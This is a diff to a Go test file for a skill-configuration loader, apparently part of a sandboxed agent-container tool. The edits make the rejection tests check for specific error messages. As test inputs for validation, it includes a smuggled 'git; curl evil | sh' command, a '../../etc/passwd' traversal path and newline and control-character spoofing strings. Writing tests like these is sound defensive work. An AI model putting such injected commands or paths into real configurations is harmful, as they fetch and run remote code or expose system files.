@@ -124,8 +124,8 @@ func TestResolveRejectsSkillContentInjection(t *testing.T) {
 	writeSkill(t, dir, "evil", "[build]\napt = [\"git; curl evil | sh\"]\n", nil)
 	writeSkill(t, dir, "fake", fakeAgentSkill, nil)
 	_, err := Resolve(config.Config{Skills: []string{"evil"}, Agent: "fake"}, catFor(t, dir))
-	if err == nil {
-		t.Fatal("expected rejection of shell metacharacters in skill apt package")
+	if err == nil || !strings.Contains(err.Error(), "not a valid package name") {
+		t.Fatalf("expected rejection of shell metacharacters in skill apt package, got %v", err)
 	}
 }
 
@@ -147,15 +147,15 @@ func TestResolveAgentMustBeAgentSkill(t *testing.T) {
 	dir := testHome(t)
 	writeSkill(t, dir, "sample", sampleSkill, nil) // no [agent]
 	_, err := Resolve(config.Config{Agent: "sample"}, catFor(t, dir))
-	if err == nil {
-		t.Fatal("expected error: selected agent skill has no [agent] command")
+	if err == nil || !strings.Contains(err.Error(), "no [agent] command") {
+		t.Fatalf("expected error: selected agent skill has no [agent] command, got %v", err)
 	}
 }
 
 func TestResolveMissingSkillErrors(t *testing.T) {
 	_, err := Resolve(config.Config{Skills: []string{"nope"}}, catFor(t, testHome(t)))
-	if err == nil {
-		t.Fatal("expected error for missing skill")
+	if err == nil || !strings.Contains(err.Error(), "not found") {
+		t.Fatalf("expected not-found error for missing skill, got %v", err)
 	}
 }
 
@@ -195,8 +195,8 @@ func TestDescriptionParsedAndListed(t *testing.T) {
 func TestLoadRejectsUnknownKey(t *testing.T) {
 	dir := testHome(t)
 	writeSkill(t, dir, "typo", "[agent]\ncommmand = \"x\"\n", nil) // misspelled command
-	if _, err := Load(catFor(t, dir), "typo"); err == nil {
-		t.Fatal("expected unknown-key error for typo'd skill.toml")
+	if _, err := Load(catFor(t, dir), "typo"); err == nil || !strings.Contains(err.Error(), "unknown key") {
+		t.Fatalf("expected unknown-key error for typo'd skill.toml, got %v", err)
 	}
 }
 
@@ -205,8 +205,11 @@ func TestLoadRejectsUnknownKey(t *testing.T) {
 // what develop would reject, not pass a skill that can't run. The shape rules
 // themselves are config.Validate's; this only pins that Load applies them.
 func TestLoadRejectsMalformedVolumesAndMounts(t *testing.T) {
-	cases := map[string]string{
-		"machine-scoped seed": `
+	cases := map[string]struct {
+		toml string
+		want string // fragment of the intended shape rule's message
+	}{
+		"machine-scoped seed": {`
 [[volumes]]
 name = "x"
 role = "state"
@@ -214,14 +217,14 @@ target = "/home/dev/.x"
 scope = "machine"
 [volumes.seed]
 host = "~/.x"
-`,
-		"bad role": `
+`, "machine-scoped"},
+		"bad role": {`
 [[volumes]]
 name = "x"
 role = "identity"
 target = "/home/dev/.x"
-`,
-		"escaping literal seed path": `
+`, `role "identity" invalid`},
+		"escaping literal seed path": {`
 [[volumes]]
 name = "x"
 role = "state"
@@ -229,12 +232,12 @@ target = "/home/dev/.x"
 [volumes.seed]
 literal = "data"
 path = "../outside"
-`,
-		"relative mount host": `
+`, "literal seed path"},
+		"relative mount host": {`
 [runtime]
 mounts = [{ host = "run/docker.sock", target = "/var/run/docker.sock" }]
-`,
-		"duplicate volume name": `
+`, "must be absolute or ~/"},
+		"duplicate volume name": {`
 [[volumes]]
 name = "x"
 role = "state"
@@ -243,13 +246,13 @@ target = "/home/dev/.x"
 name = "x"
 role = "cache"
 target = "/home/dev/.y"
-`,
+`, "duplicate name"},
 	}
-	for name, toml := range cases {
+	for name, tc := range cases {
 		dir := testHome(t)
-		writeSkill(t, dir, "broken", toml, nil)
-		if _, err := Load(catFor(t, dir), "broken"); err == nil {
-			t.Errorf("%s: Load accepted a skill that cannot run", name)
+		writeSkill(t, dir, "broken", tc.toml, nil)
+		if _, err := Load(catFor(t, dir), "broken"); err == nil || !strings.Contains(err.Error(), tc.want) {
+			t.Errorf("%s: Load must reject with %q, got %v", name, tc.want, err)
 		}
 	}
 }
@@ -298,8 +301,8 @@ func TestResolveAgentStateMustBeContributed(t *testing.T) {
 	dir := testHome(t)
 	// declares state ".claude" but contributes no such state volume
 	writeSkill(t, dir, "claudish", "[agent]\ncommand = \"claude\"\nstate = \".claude\"\n", nil)
-	if _, err := Resolve(config.Config{Agent: "claudish"}, catFor(t, dir)); err == nil {
-		t.Fatal("expected error: agent.state names no contributed state volume")
+	if _, err := Resolve(config.Config{Agent: "claudish"}, catFor(t, dir)); err == nil || !strings.Contains(err.Error(), "not a state volume") {
+		t.Fatalf("expected error: agent.state names no contributed state volume, got %v", err)
 	}
 }
 
@@ -338,8 +341,8 @@ func TestResolvePrefsRequireState(t *testing.T) {
 	dir := testHome(t)
 	// prefs but no [agent].state -> nowhere to seed -> error.
 	writeSkill(t, dir, "fake", "[agent]\ncommand = \"x\"\n[agent.prefs]\nfrom = \"~/.fake\"\nfiles = [\"a\"]\n", nil)
-	if _, err := Resolve(config.Config{Agent: "fake"}, catFor(t, dir)); err == nil {
-		t.Fatal("expected error: prefs require a state volume")
+	if _, err := Resolve(config.Config{Agent: "fake"}, catFor(t, dir)); err == nil || !strings.Contains(err.Error(), "requires [agent].state") {
+		t.Fatalf("expected error: prefs require a state volume, got %v", err)
 	}
 }
 
@@ -348,8 +351,8 @@ func TestResolvePrefsRejectsEscapingFile(t *testing.T) {
 	toml := "[agent]\ncommand = \"x\"\nstate = \".fake\"\n[agent.prefs]\nfrom = \"~/.fake\"\nfiles = [\"../../etc/passwd\"]\n" +
 		"[[volumes]]\nname = \".fake\"\nrole = \"state\"\ntarget = \"/home/dev/.fake\"\n"
 	writeSkill(t, dir, "fake", toml, nil)
-	if _, err := Resolve(config.Config{Agent: "fake"}, catFor(t, dir)); err == nil {
-		t.Fatal("expected error: prefs file escapes from-dir")
+	if _, err := Resolve(config.Config{Agent: "fake"}, catFor(t, dir)); err == nil || !strings.Contains(err.Error(), "stay within from") {
+		t.Fatalf("expected error: prefs file escapes from-dir, got %v", err)
 	}
 }
 
@@ -361,8 +364,8 @@ func TestResolvePrefsRejectsWholeDir(t *testing.T) {
 		toml := "[agent]\ncommand = \"x\"\nstate = \".fake\"\n[agent.prefs]\nfrom = \"~/.fake\"\nfiles = [\"" + bad + "\"]\n" +
 			"[[volumes]]\nname = \".fake\"\nrole = \"state\"\ntarget = \"/home/dev/.fake\"\n"
 		writeSkill(t, dir, "fake", toml, nil)
-		if _, err := Resolve(config.Config{Agent: "fake"}, catFor(t, dir)); err == nil {
-			t.Fatalf("expected rejection of prefs file %q (whole-dir copy)", bad)
+		if _, err := Resolve(config.Config{Agent: "fake"}, catFor(t, dir)); err == nil || !strings.Contains(err.Error(), "stay within from") {
+			t.Fatalf("expected rejection of prefs file %q (whole-dir copy), got %v", bad, err)
 		}
 	}
 }
@@ -413,8 +416,8 @@ func TestResolveSkillFilesRejectsRelativeDest(t *testing.T) {
 	dir := testHome(t)
 	writeSkill(t, dir, "bad", "[build]\nfiles = { \"x.sh\" = \"relative/dest\" }\n",
 		map[string]string{"x.sh": "x\n"})
-	if _, err := Resolve(config.Config{Skills: []string{"bad"}}, catFor(t, dir)); err == nil {
-		t.Fatal("expected rejection of non-absolute file destination")
+	if _, err := Resolve(config.Config{Skills: []string{"bad"}}, catFor(t, dir)); err == nil || !strings.Contains(err.Error(), "must be an absolute image path") {
+		t.Fatalf("expected rejection of non-absolute file destination, got %v", err)
 	}
 }
 
@@ -475,8 +478,8 @@ role = "state"
 target = "/home/dev/.fake"
 `
 	writeSkill(t, dir, "fake", toml, nil)
-	if _, err := Resolve(config.Config{Agent: "fake"}, catFor(t, dir)); err == nil {
-		t.Fatal("expected rejection of non-absolute context_target")
+	if _, err := Resolve(config.Config{Agent: "fake"}, catFor(t, dir)); err == nil || !strings.Contains(err.Error(), "must be an absolute path") {
+		t.Fatalf("expected rejection of non-absolute context_target, got %v", err)
 	}
 }
 
@@ -506,8 +509,8 @@ role = "state"
 target = "/home/dev/.fake"
 `
 	writeSkill(t, dir, "fake", toml, nil)
-	if _, err := Resolve(config.Config{Agent: "fake"}, catFor(t, dir)); err == nil {
-		t.Fatal("expected rejection of context_target outside /home/dev")
+	if _, err := Resolve(config.Config{Agent: "fake"}, catFor(t, dir)); err == nil || !strings.Contains(err.Error(), "strictly within") {
+		t.Fatalf("expected rejection of context_target outside /home/dev, got %v", err)
 	}
 }
 
@@ -524,8 +527,8 @@ role = "state"
 target = "/home/dev/.fake"
 `
 	writeSkill(t, dir, "fake", toml, nil)
-	if _, err := Resolve(config.Config{Agent: "fake"}, catFor(t, dir)); err == nil {
-		t.Fatal("expected rejection of context_target == /home/dev (not a file)")
+	if _, err := Resolve(config.Config{Agent: "fake"}, catFor(t, dir)); err == nil || !strings.Contains(err.Error(), "strictly within") {
+		t.Fatalf("expected rejection of context_target == /home/dev (not a file), got %v", err)
 	}
 }
 
@@ -614,8 +617,8 @@ func TestResolveRejectsConflictingPostures(t *testing.T) {
 	writeSkill(t, dir, "fw1", "[runtime]\nnetwork_posture = \"deny-by-default\"\n", nil)
 	writeSkill(t, dir, "fw2", "[runtime]\nnetwork_posture = \"deny-by-default\"\n", nil)
 	_, err := Resolve(config.Config{Skills: []string{"fw1", "fw2"}}, catFor(t, dir))
-	if err == nil {
-		t.Fatal("two skills declaring a posture must be rejected (even identical: each claims the stance)")
+	if err == nil || !strings.Contains(err.Error(), "both declare a network_posture") {
+		t.Fatalf("two skills declaring a posture must be rejected (even identical: each claims the stance), got %v", err)
 	}
 	for _, want := range []string{"fw1", "fw2"} {
 		if !strings.Contains(err.Error(), want) {
@@ -628,16 +631,16 @@ func TestResolveRejectsMalformedPosture(t *testing.T) {
 	dir := testHome(t)
 	// Status prints the posture verbatim; a spoofing label must be rejected.
 	writeSkill(t, dir, "fw", "[runtime]\nnetwork_posture = \"open  (all good)\"\n", nil)
-	if _, err := Resolve(config.Config{Skills: []string{"fw"}}, catFor(t, dir)); err == nil {
-		t.Fatal("posture with spaces/parens must be rejected")
+	if _, err := Resolve(config.Config{Skills: []string{"fw"}}, catFor(t, dir)); err == nil || !strings.Contains(err.Error(), "must match") {
+		t.Fatalf("posture with spaces/parens must be rejected, got %v", err)
 	}
 }
 
 func TestResolveRejectsRelativeNetnsInit(t *testing.T) {
 	dir := testHome(t)
 	writeSkill(t, dir, "fw", "[runtime]\nnetns_init = \"bin/fw\"\n", nil)
-	if _, err := Resolve(config.Config{Skills: []string{"fw"}}, catFor(t, dir)); err == nil {
-		t.Fatal("relative netns_init must be rejected")
+	if _, err := Resolve(config.Config{Skills: []string{"fw"}}, catFor(t, dir)); err == nil || !strings.Contains(err.Error(), "must be an absolute image path") {
+		t.Fatalf("relative netns_init must be rejected, got %v", err)
 	}
 }
 
@@ -649,8 +652,8 @@ func TestResolveRejectsTwoNetnsInits(t *testing.T) {
 	writeSkill(t, dir, "fw1", "[runtime]\nnetns_init = \"/usr/local/bin/fw1\"\n", nil)
 	writeSkill(t, dir, "fw2", "[runtime]\nnetns_init = \"/usr/local/bin/fw2\"\n", nil)
 	_, err := Resolve(config.Config{Skills: []string{"fw1", "fw2"}}, catFor(t, dir))
-	if err == nil {
-		t.Fatal("two skills declaring a netns_init must be rejected")
+	if err == nil || !strings.Contains(err.Error(), "both declare a netns_init") {
+		t.Fatalf("two skills declaring a netns_init must be rejected, got %v", err)
 	}
 	for _, want := range []string{"fw1", "fw2"} {
 		if !strings.Contains(err.Error(), want) {
@@ -695,8 +698,8 @@ func TestEgressRejectsMalformed(t *testing.T) {
 	for _, bad := range []string{"api.anthropic.com:99999", "has space.com", "host:notaport:443", "bad;host"} {
 		dir := t.TempDir()
 		writeSkill(t, dir, "fw", "[runtime]\negress = [\""+bad+"\"]\n", nil)
-		if _, err := Resolve(config.Config{Skills: []string{"fw"}}, catFor(t, dir)); err == nil {
-			t.Errorf("egress %q must be rejected", bad)
+		if _, err := Resolve(config.Config{Skills: []string{"fw"}}, catFor(t, dir)); err == nil || !strings.Contains(err.Error(), `egress "`+bad+`"`) {
+			t.Errorf("egress %q must be rejected by the egress grammar, got %v", bad, err)
 		}
 	}
 }
@@ -872,8 +875,8 @@ func TestResolveRejectsSockGroupsWithoutMount(t *testing.T) {
 	writeSkill(t, dir, "dh", `[runtime]
 sock_groups = ["/var/run/docker.sock"]
 `, nil)
-	if _, err := Resolve(config.Config{Skills: []string{"dh"}}, catFor(t, dir)); err == nil {
-		t.Fatal("sock_groups without matching mount target must be rejected")
+	if _, err := Resolve(config.Config{Skills: []string{"dh"}}, catFor(t, dir)); err == nil || !strings.Contains(err.Error(), "must match an active mount target") {
+		t.Fatalf("sock_groups without matching mount target must be rejected, got %v", err)
 	}
 }
 
@@ -884,8 +887,8 @@ func TestResolveRejectsRelativeSockGroup(t *testing.T) {
 mounts = [{ host = "/h", target = "/t", mode = "rw" }]
 sock_groups = ["relative"]
 `, nil)
-	if _, err := Resolve(config.Config{Skills: []string{"dh"}}, catFor(t, dir)); err == nil {
-		t.Fatal("relative sock_groups path must be rejected")
+	if _, err := Resolve(config.Config{Skills: []string{"dh"}}, catFor(t, dir)); err == nil || !strings.Contains(err.Error(), "must be absolute") {
+		t.Fatalf("relative sock_groups path must be rejected, got %v", err)
 	}
 }
 
@@ -894,14 +897,14 @@ func TestResolveRejectsContainmentNewline(t *testing.T) {
 	// Literal newline inside the TOML string is invalid TOML; use the escaped
 	// form so Load succeeds and validateOneLiner rejects the decoded value.
 	writeSkill(t, dir, "dh", "[runtime]\ncontainment = \"hole\\nNetwork: open\"\n", nil)
-	if _, err := Resolve(config.Config{Skills: []string{"dh"}}, catFor(t, dir)); err == nil {
-		t.Fatal("containment with newline must be rejected")
+	if _, err := Resolve(config.Config{Skills: []string{"dh"}}, catFor(t, dir)); err == nil || !strings.Contains(err.Error(), "single line") {
+		t.Fatalf("containment with newline must be rejected, got %v", err)
 	}
 }
 
 func TestValidateOneLinerControlChar(t *testing.T) {
-	if err := validateOneLiner("hole\x01forged"); err == nil {
-		t.Fatal("control char must be rejected")
+	if err := validateOneLiner("hole\x01forged"); err == nil || !strings.Contains(err.Error(), "control characters") {
+		t.Fatalf("control char must be rejected, got %v", err)
 	}
 	if err := validateOneLiner("ok one-liner"); err != nil {
 		t.Fatalf("valid one-liner rejected: %v", err)
@@ -912,8 +915,8 @@ func TestResolveRejectsContainmentTooLong(t *testing.T) {
 	dir := t.TempDir()
 	long := strings.Repeat("x", oneLinerMaxLen+1)
 	writeSkill(t, dir, "dh", "[runtime]\ncontainment = \""+long+"\"\n", nil)
-	if _, err := Resolve(config.Config{Skills: []string{"dh"}}, catFor(t, dir)); err == nil {
-		t.Fatal("overlong containment must be rejected")
+	if _, err := Resolve(config.Config{Skills: []string{"dh"}}, catFor(t, dir)); err == nil || !strings.Contains(err.Error(), "at most") {
+		t.Fatalf("overlong containment must be rejected, got %v", err)
 	}
 }
 
@@ -948,18 +951,18 @@ GEMINI_API_KEY = "also consumed here"
 func TestResolveRejectsBadEnvDocs(t *testing.T) {
 	dir := testHome(t)
 	writeSkill(t, dir, "badkey", "[runtime.env_docs]\n\"NOT A VAR\" = \"guidance\"\n", nil)
-	if _, err := Resolve(config.Config{Skills: []string{"badkey"}}, catFor(t, dir)); err == nil {
-		t.Fatal("invalid env_docs key must be rejected")
+	if _, err := Resolve(config.Config{Skills: []string{"badkey"}}, catFor(t, dir)); err == nil || !strings.Contains(err.Error(), "not a valid environment variable name") {
+		t.Fatalf("invalid env_docs key must be rejected, got %v", err)
 	}
 	dir2 := testHome(t)
 	writeSkill(t, dir2, "empty", "[runtime.env_docs]\nFOO = \"\"\n", nil)
-	if _, err := Resolve(config.Config{Skills: []string{"empty"}}, catFor(t, dir2)); err == nil {
-		t.Fatal("empty env_docs guidance must be rejected")
+	if _, err := Resolve(config.Config{Skills: []string{"empty"}}, catFor(t, dir2)); err == nil || !strings.Contains(err.Error(), "must not be empty") {
+		t.Fatalf("empty env_docs guidance must be rejected, got %v", err)
 	}
 	dir3 := testHome(t)
 	writeSkill(t, dir3, "multiline", "[runtime.env_docs]\nFOO = \"line\\nline2\"\n", nil)
-	if _, err := Resolve(config.Config{Skills: []string{"multiline"}}, catFor(t, dir3)); err == nil {
-		t.Fatal("multi-line env_docs guidance must be rejected")
+	if _, err := Resolve(config.Config{Skills: []string{"multiline"}}, catFor(t, dir3)); err == nil || !strings.Contains(err.Error(), "single line") {
+		t.Fatalf("multi-line env_docs guidance must be rejected, got %v", err)
 	}
 }
 
@@ -1031,8 +1034,8 @@ func TestLoadHostileContextFileFailsNotBlocks(t *testing.T) {
 	}()
 	select {
 	case err := <-done:
-		if err == nil {
-			t.Fatal("Load must refuse a FIFO context file")
+		if err == nil || !strings.Contains(err.Error(), "not a regular file") {
+			t.Fatalf("Load must refuse a FIFO context file as not-a-regular-file, got %v", err)
 		}
 	case <-time.After(5 * time.Second):
 		t.Fatal("Load blocked on a FIFO context file — the exact hang skill load must never have")
